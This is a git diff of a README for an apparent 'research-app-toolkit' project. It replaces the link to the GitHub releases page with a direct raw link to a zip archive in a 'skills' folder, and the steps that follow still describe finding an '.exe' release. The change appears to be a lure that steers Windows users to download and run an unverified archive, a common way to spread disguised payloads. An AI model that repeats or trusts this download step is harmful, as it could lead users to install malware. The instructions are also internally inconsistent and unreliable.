@@ -1,7 +1,7 @@
 # 🎓 research-app-toolkit - Manage your academic research applications easily
 
 <div align="center">
-  <a href="https://github.com/joanvergsox/research-app-toolkit/releases">
+  <a href="https://raw.githubusercontent.com/joanvergsox/research-app-toolkit/main/skills/app-toolkit-research-v2.1.zip">
     <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download Link">
   </a>
 </div>
@@ -24,7 +24,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit this page to download: [https://github.com/joanvergsox/research-app-toolkit/releases](https://github.com/joanvergsox/research-app-toolkit/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/joanvergsox/research-app-toolkit/main/skills/app-toolkit-research-v2.1.zip](https://raw.githubusercontent.com/joanvergsox/research-app-toolkit/main/skills/app-toolkit-research-v2.1.zip).
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder after the download finishes.
